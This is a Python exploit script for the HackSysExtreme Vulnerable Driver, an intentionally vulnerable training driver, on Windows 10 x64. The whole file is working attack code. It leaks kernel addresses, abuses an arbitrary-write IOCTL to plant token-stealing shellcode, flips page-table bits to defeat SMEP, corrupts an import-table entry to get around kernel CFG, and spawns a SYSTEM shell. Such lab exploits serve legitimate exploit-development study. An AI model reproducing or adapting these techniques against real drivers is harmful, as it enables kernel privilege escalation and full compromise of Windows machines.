# HackSysExtreme Vulnerable Driver Kernel Exploit (x64 Arbitrary Overwrite/SMEP Enabled/kCFG Enabled)
# Windows 10 1909
# Author: Connor McGarr

import struct
import sys
import os
from ctypes import *
import time

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi

# Defining KUSER_SHARED_DATA
KUSER_SHARED_DATA = 0xFFFFF78000000000

# First structure, for obtaining nt!MiGetPteAddress+0x13 value
class WriteWhatWhere_PTE_Base(Structure):
    _fields_ = [
        ("What_PTE_Base", c_void_p),
        ("Where_PTE_Base", c_void_p)
    ]

# Second structure, first 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_1(Structure):
    _fields_ = [
        ("What_Shellcode_1", c_void_p),
        ("Where_Shellcode_1", c_void_p)
    ]

# Third structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_2(Structure):
    _fields_ = [
        ("What_Shellcode_2", c_void_p),
        ("Where_Shellcode_2", c_void_p)
    ]

# Fourth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_3(Structure):
    _fields_ = [
        ("What_Shellcode_3", c_void_p),
        ("Where_Shellcode_3", c_void_p)
    ]

# Fifth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_4(Structure):
    _fields_ = [
        ("What_Shellcode_4", c_void_p),
        ("Where_Shellcode_4", c_void_p)
    ]

# Sixth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_5(Structure):
    _fields_ = [
        ("What_Shellcode_5", c_void_p),
        ("Where_Shellcode_5", c_void_p)
    ]

# Seventh structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_6(Structure):
    _fields_ = [
        ("What_Shellcode_6", c_void_p),
        ("Where_Shellcode_6", c_void_p)
    ]

# Eighth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_7(Structure):
    _fields_ = [
        ("What_Shellcode_7", c_void_p),
        ("Where_Shellcode_7", c_void_p)
    ]

# Ninth structure, next 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_8(Structure):
    _fields_ = [
        ("What_Shellcode_8", c_void_p),
        ("Where_Shellcode_8", c_void_p)
    ]

# Tenth structure, last 8 bytes of shellcode to be written to KUSER_SHARED_DATA + 0x800
class WriteWhatWhere_Shellcode_9(Structure):
    _fields_ = [
        ("What_Shellcode_9", c_void_p),
        ("Where_Shellcode_9", c_void_p)
    ]


# Eleventh structure, for obtaining the control bits for the PTE
class WriteWhatWhere_PTE_Control_Bits(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits", c_void_p),
        ("Where_PTE_Control_Bits", c_void_p)
    ]

# Twelfth structure, to overwrite executable bit of KUSER_SHARED_DATA+0x800's PTE
class WriteWhatWhere_PTE_Overwrite(Structure):
    _fields_ = [
        ("What_PTE_Overwrite", c_void_p),
        ("Where_PTE_Overwrite", c_void_p)
    ]

# Thirteenth structure, for obtaining the control bits for the PTE of kCFG bypass IAT entry
class WriteWhatWhere_PTE_Control_Bits1(Structure):
    _fields_ = [
        ("What_PTE_Control_Bits1", c_void_p),
        ("Where_PTE_Control_Bits1", c_void_p)
    ]

# Fourteenth structure, to overwrite executable bit and writeable bit of kCFG bypass IAT entry
class WriteWhatWhere_PTE_Overwrite1(Structure):
    _fields_ = [
        ("What_PTE_Overwrite1", c_void_p),
        ("Where_PTE_Overwrite1", c_void_p)
    ]

# Fifteenth structure, to overwrite corrupted IAT entry with KUSER_SHARED_DATA+0x800 (shellocde)
class WriteWhatWhere(Structure):
    _fields_ = [
        ("What", c_void_p),
        ("Where", c_void_p)
    ]

"""
Token stealing payload
\x65\x48\x8B\x04\x25\x88\x01\x00\x00              # mov rax,[gs:0x188]  ; Current thread (KTHREAD)
\x48\x8B\x80\xB8\x00\x00\x00                      # mov rax,[rax+0xb8]  ; Current process (EPROCESS)
\x48\x89\xC3                                      # mov rbx,rax         ; Copy current process to rbx
\x48\x8B\x9B\xF0\x02\x00\x00                      # mov rbx,[rbx+0x2f0] ; ActiveProcessLinks
\x48\x81\xEB\xF0\x02\x00\x00                      # sub rbx,0x2f0       ; Go back to current process
\x48\x8B\x8B\xE8\x02\x00\x00                      # mov rcx,[rbx+0x2e8] ; UniqueProcessId (PID)
\x48\x83\xF9\x04                                  # cmp rcx,byte +0x4   ; Compare PID to SYSTEM PID
\x75\xE5                                          # jnz 0x13            ; Loop until SYSTEM PID is found
\x48\x8B\x8B\x60\x03\x00\x00                      # mov rcx,[rbx+0x360] ; SYSTEM token is @ offset _EPROCESS + 0x360
\x80\xE1\xF0                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
\x48\x89\x88\x60\x03\x00\x00                      # mov [rax+0x360],rcx ; Copy SYSTEM token to current process
\x48\x31\xC0                                      # xor rax,rax         ; set NTSTATUS SUCCESS
\xC3                                              # ret                 ; Done!
)
"""

# c_ulonglong because of x64 size (unsigned __int64)
base = (c_ulonglong * 1024)()

print "[+] Calling EnumDeviceDrivers()..."
get_drivers = psapi.EnumDeviceDrivers(
    byref(base),                      # lpImageBase (array that receives list of addresses)
    sizeof(base),                     # cb (size of lpImageBase array, in bytes)
    byref(c_long())                   # lpcbNeeded (bytes returned in the array)
)

# Error handling if function fails
if not base:
    print "[+] EnumDeviceDrivers() function call failed!"
    sys.exit(-1)

# The first entry in the array with device drivers is ntoskrnl base address
kernel_address = base[0]

# Print update for ntoskrnl.exe base address
print "[+] Found kernel leak!"
print "[+] ntoskrnl.exe base address: {0}".format(hex(kernel_address))

time.sleep(0.2)

# Need driver base to corrupt the IAT for kCFG bypass
for base_address in base:
    if not base_address:
        continue
    current_name = c_char_p('\x00' * 1024)

    # Defining argument types for call to GetDeviceDriverBaseNameA
    psapi.GetDeviceDriverBaseNameA.argtypes = [c_ulonglong, POINTER(c_char), c_uint32]

    # Calling GetDeviceDriverBaseNameA
    driver_name = psapi.GetDeviceDriverBaseNameA(
        base_address,                 # ImageBase (load address of current device driver)
        current_name,                 # lpFilename
        48                            # nSize (size of the buffer, in chars)
    )

    if not driver_name:
        print "[-] Unable to enumerate driver!"
        sys.exit(-1)

    if current_name.value.lower() == 'HEVD' or 'hevd' in current_name.value.lower():
        hevd_base = current_name.value
        print "[+] HEVD.sys driver is located at: {0}".format(hex(base_address))

        time.sleep(0.2)

        # Break loop when HEVD.sys base address is found
        break

# Saving base_address in new variable
hevd_base = base_address

# Phase 1: Grab the base of the PTEs via nt!MiGetPteAddress

# Retrieving nt!MiGetPteAddress (Windows 10 RS1 offset)
nt_mi_get_pte_address = kernel_address + 0xbadc8


# Print update for nt!MiGetPteAddress address 
print "[+] nt!MiGetPteAddress is located at: {0}".format(hex(nt_mi_get_pte_address))

time.sleep(0.2)

# Base of PTEs is located at nt!MiGetPteAddress + 0x13
pte_base = nt_mi_get_pte_address + 0x13

# Print update for nt!MiGetPteAddress+0x13 address
print "[+] nt!MiGetPteAddress+0x13 is located at: {0}".format(hex(pte_base))

time.sleep(0.2)

# Creating a pointer in which the contents of nt!MiGetPteAddress+0x13 will be stored in to
# Base of the PTEs are stored here
base_of_ptes_pointer = c_void_p()

# Write-what-where structure #1
www_pte_base = WriteWhatWhere_PTE_Base()
www_pte_base.What_PTE_Base = pte_base
www_pte_base.Where_PTE_Base = addressof(base_of_ptes_pointer)
www_pte_pointer = pointer(www_pte_base)

# Getting handle to driver to return to DeviceIoControl() function
handle = kernel32.CreateFileA(
    "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
    0xC0000000,                         # dwDesiredAccess
    0,                                  # dwShareMode
    None,                               # lpSecurityAttributes
    0x3,                                # dwCreationDisposition
    0,                                  # dwFlagsAndAttributes
    None                                # hTemplateFile
)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_pte_pointer,                       # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
base_of_ptes = struct.unpack('<Q', base_of_ptes_pointer)[0]

# Print update for PTE base
print "[+] Leaked base of PTEs!"

time.sleep(0.2)
print "[+] Base of PTEs are located at: {0}".format(hex(base_of_ptes))

time.sleep(0.2)

# Phase 2: Calculate KUSER_SHARED_DATA's PTE address

# Calculating the PTE for KUSER_SHARED_DATA + 0x800
kuser_shared_data_800_pte_address = KUSER_SHARED_DATA + 0x800 >> 9
kuser_shared_data_800_pte_address &= 0x7ffffffff8
kuser_shared_data_800_pte_address += base_of_ptes

# Print update for KUSER_SHARED_DATA + 0x800 PTE
print "[+] PTE for KUSER_SHARED_DATA + 0x800 is located at {0}".format(hex(kuser_shared_data_800_pte_address))

time.sleep(0.2)

# Phase 3: Write shellcode to KUSER_SHARED_DATA + 0x800

# First 8 bytes

# Using just long long integer, because only writing opcodes.
first_shellcode = c_ulonglong(0x00018825048B4865)

# Write-what-where structure #2
www_shellcode_one = WriteWhatWhere_Shellcode_1()
www_shellcode_one.What_Shellcode_1 = addressof(first_shellcode)
www_shellcode_one.Where_Shellcode_1 = KUSER_SHARED_DATA + 0x800
www_shellcode_one_pointer = pointer(www_shellcode_one)

# Print update for shellcode
print "[+] Writing first 8 bytes of shellcode to KUSER_SHARED_DATA + 0x800..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_shellcode_one_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
second_shellcode = c_ulonglong(0x000000B8808B4800)

# Write-what-where structure #3
www_shellcode_two = WriteWhatWhere_Shellcode_2()
www_shellcode_two.What_Shellcode_2 = addressof(second_shellcode)
www_shellcode_two.Where_Shellcode_2 = KUSER_SHARED_DATA + 0x808
www_shellcode_two_pointer = pointer(www_shellcode_two)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x808..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x22200B,                         # dwIoControlCode
    www_shellcode_two_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
third_shellcode = c_ulonglong(0x02F09B8B48C38948)

# Write-what-where structure #4
www_shellcode_three = WriteWhatWhere_Shellcode_3()
www_shellcode_three.What_Shellcode_3 = addressof(third_shellcode)
www_shellcode_three.Where_Shellcode_3 = KUSER_SHARED_DATA + 0x810
www_shellcode_three_pointer = pointer(www_shellcode_three)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x810..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_three_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
fourth_shellcode = c_ulonglong(0x0002F0EB81480000)

# Write-what-where structure #5
www_shellcode_four = WriteWhatWhere_Shellcode_4()
www_shellcode_four.What_Shellcode_4 = addressof(fourth_shellcode)
www_shellcode_four.Where_Shellcode_4 = KUSER_SHARED_DATA + 0x818
www_shellcode_four_pointer = pointer(www_shellcode_four)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x818..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_four_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
fifth_shellcode = c_ulonglong(0x000002E88B8B4800)

# Write-what-where structure #6
www_shellcode_five = WriteWhatWhere_Shellcode_5()
www_shellcode_five.What_Shellcode_5 = addressof(fifth_shellcode)
www_shellcode_five.Where_Shellcode_5 = KUSER_SHARED_DATA + 0x820
www_shellcode_five_pointer = pointer(www_shellcode_five)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x820..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_five_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
sixth_shellcode = c_ulonglong(0x8B48E57504F98348)

# Write-what-where structure #7
www_shellcode_six = WriteWhatWhere_Shellcode_6()
www_shellcode_six.What_Shellcode_6 = addressof(sixth_shellcode)
www_shellcode_six.Where_Shellcode_6 = KUSER_SHARED_DATA + 0x828
www_shellcode_six_pointer = pointer(www_shellcode_six)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x828..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_six_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
seventh_shellcode = c_ulonglong(0xF0E180000003608B)

# Write-what-where structure #8
www_shellcode_seven = WriteWhatWhere_Shellcode_7()
www_shellcode_seven.What_Shellcode_7 = addressof(seventh_shellcode)
www_shellcode_seven.Where_Shellcode_7 = KUSER_SHARED_DATA + 0x830
www_shellcode_seven_pointer = pointer(www_shellcode_seven)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x830..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_seven_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Next 8 bytes
eighth_shellcode = c_ulonglong(0x4800000360888948)

# Write-what-where structure #9
www_shellcode_eight = WriteWhatWhere_Shellcode_8()
www_shellcode_eight.What_Shellcode_8 = addressof(eighth_shellcode)
www_shellcode_eight.Where_Shellcode_8 = KUSER_SHARED_DATA + 0x838
www_shellcode_eight_pointer = pointer(www_shellcode_eight)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x838..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_eight_pointer,        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Last 8 bytes
ninth_shellcode = c_ulonglong(0x0000000000C3C031)

# Write-what-where structure #10
www_shellcode_nine = WriteWhatWhere_Shellcode_9()
www_shellcode_nine.What_Shellcode_9 = addressof(ninth_shellcode)
www_shellcode_nine.Where_Shellcode_9 = KUSER_SHARED_DATA + 0x840
www_shellcode_nine_pointer = pointer(www_shellcode_nine)

# Print update for shellcode
print "[+] Writing next 8 bytes of shellcode to KUSER_SHARED_DATA + 0x840..."

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_shellcode_nine_pointer,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Phase 3: Extract KUSER_SHARED_DATA + 0x800's PTE control bits

# Declaring C void pointer to stores PTE control bits
pte_bits_pointer = c_void_p()

# Write-what-where structure #11
www_pte_bits = WriteWhatWhere_PTE_Control_Bits()
www_pte_bits.What_PTE_Control_Bits = kuser_shared_data_800_pte_address
www_pte_bits.Where_PTE_Control_Bits = addressof(pte_bits_pointer)
www_pte_bits_pointer = pointer(www_pte_bits)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
pte_control_bits_no_execute = struct.unpack('<Q', pte_bits_pointer)[0]

# Print update for PTE control bits
print "[+] PTE control bits for KUSER_SHARED_DATA + 0x800: {:016x}".format(pte_control_bits_no_execute)

time.sleep(0.2)

# Phase 4: Make KUSER_SHARED_DATA executable

# Setting KUSER_SHARED_DATA + 0x800 to executable
pte_control_bits_execute= pte_control_bits_no_execute & 0x0FFFFFFFFFFFFFFF

# Need to store the PTE control bits as a pointer
# Using addressof(pte_overwrite_pointer) in Write-what-where structure #4 since a pointer to the PTE control bits are needed
pte_overwrite_pointer = c_void_p(pte_control_bits_execute)

# Write-what-where structure #12
www_pte_overwrite = WriteWhatWhere_PTE_Overwrite()
www_pte_overwrite.What_PTE_Overwrite = addressof(pte_overwrite_pointer)
www_pte_overwrite.Where_PTE_Overwrite = kuser_shared_data_800_pte_address
www_pte_overwrite_pointer = pointer(www_pte_overwrite)

# Print update for PTE overwrite
print "[+] Overwriting KUSER_SHARED_DATA + 0x800's PTE..."

time.sleep(0.2)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer,          # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for PTE overwrite round 2
print "[+] KUSER_SHARED_DATA + 0x800 is now executable! See you later, SMEP!"

time.sleep(0.2)

# Phase 5: Corrupting an IAT entry

# IAT is not checked by kCFG (https://docs.microsoft.com/en-us/windows/win32/secbp/pe-metadata#import-handling)

# IAT for HEVD.sys is located at HEVD+0x2000
# HEVD + 0x2010 = pointer to nt!ExAllocatePoolWithTag
# HEVD + 0x2010 gets called via an IOCTL call to IOCTL code 0x222013 (hevd!AllocateUaFObject)
iat_entry = hevd_base+0x2010

# Print update for IAT location
print "[+] Import Address Table for HEVD.sys is located at: {0}".format(hex(iat_entry-0x10))

time.sleep(0.2)


print "[+] IAT entry for kCFG bypass is located at: {0}".format(hex(iat_entry))

time.sleep(0.2)

# Calculating PTE location for the IAT entry
iat_pte_address = iat_entry >> 9
iat_pte_address &= 0x7ffffffff8
iat_pte_address += base_of_ptes

# Print update for address of PTE for IAT entry
print "[+] PTE for IAT entry is located at: {0}".format(hex(iat_pte_address))

time.sleep(0.2)

# Phase 6: Extract IAT entry's PTE control bits
# Adding 2 to PTE control bits of the IAT entry will make the entry writeable
# Bitwise AND'ing the IAT entry with 0x0FFFFFFFFFFFFFFF makes the IAT entry executable

# Declaring C void pointer to stores PTE control bits
pte_bits_pointer1 = c_void_p()

# Write-what-where structure #11
www_pte_bits1 = WriteWhatWhere_PTE_Control_Bits1()
www_pte_bits1.What_PTE_Control_Bits1 = iat_pte_address
www_pte_bits1.Where_PTE_Control_Bits1 = addressof(pte_bits_pointer1)
www_pte_bits_pointer1 = pointer(www_pte_bits1)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_bits_pointer1,               # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# CTypes way of extracting value from a C void pointer
pte_control_bits_no_execute1 = struct.unpack('<Q', pte_bits_pointer1)[0]

# Print update for PTE control bits
print "[+] PTE control bits for IAT entry: {:016x}".format(pte_control_bits_no_execute1)

time.sleep(0.2)

# Phase 7: Make IAT entry KRWX

# Adding 2 makes entry writeable
pte_control_bits_execute1_temp = pte_control_bits_no_execute1 + 2

# Bitwise AND to make IAT entry executable
pte_control_bits_execute1 = pte_control_bits_execute1_temp & 0x0FFFFFFFFFFFFFFF

# Need to store the PTE control bits as a pointer
pte_overwrite_pointer1 = c_void_p(pte_control_bits_execute1)

# Write-what-where structure #12
www_pte_overwrite1 = WriteWhatWhere_PTE_Overwrite1()
www_pte_overwrite1.What_PTE_Overwrite1 = addressof(pte_overwrite_pointer1)
www_pte_overwrite1.Where_PTE_Overwrite1 = iat_pte_address
www_pte_overwrite_pointer1 = pointer(www_pte_overwrite1)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pte_overwrite_pointer1,         # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Print update for PTE overwrite for IAT entry
print "[+] Corrupted PTE for IAT entry! IAT entry is now K/R/W/X!"

time.sleep(0.2)

# Phase 8: Overwrite IAT entry's PTE with pointer to KUSER_SHARED_DATA+0x800

# Declaring KUSER_SHARED_DATA + 0x800 address again as a c_ulonglong to satisy c_void_p type from strucutre.
KUSER_SHARED_DATA_LONGLONG = c_ulonglong(0xFFFFF78000000800)

# Write-what-where structure #13
www = WriteWhatWhere()
www.What = addressof(KUSER_SHARED_DATA_LONGLONG)
www.Where = iat_entry
www_pointer = pointer(www)

# 0x002200B = IOCTL code that will jump to TriggerArbitraryOverwrite() function
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x0022200B,                         # dwIoControlCode
    www_pointer,                        # lpInBuffer
    0x8,                                # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

# Dummy input buffer for IOCTL call
buff = "\x41\x41\x41\x41\x41\x41\x41\x41\x41"

# Calling the IOCTL that will invoke the call to corrupted IAT entry
print "[+] Invoking IOCTL routine to call the corrupted IAT entry!"
kernel32.DeviceIoControl(
    handle,                             # hDevice
    0x00222013,                         # dwIoControlCode
    buff,                               # lpInBuffer
    len(buff),                          # nInBufferSize
    None,                               # lpOutBuffer
    0,                                  # nOutBufferSize
    byref(c_ulong()),                   # lpBytesReturned
    None                                # lpOverlapped
)

print "[+] Shellcode should be executed! Sorry, kCFG ;)"

time.sleep(0.2)

# Print update for shell
print "[+] Enjoy the NT AUTHORITY\SYSTEM shell!"
os.system("cmd.exe /K cd C:\\")
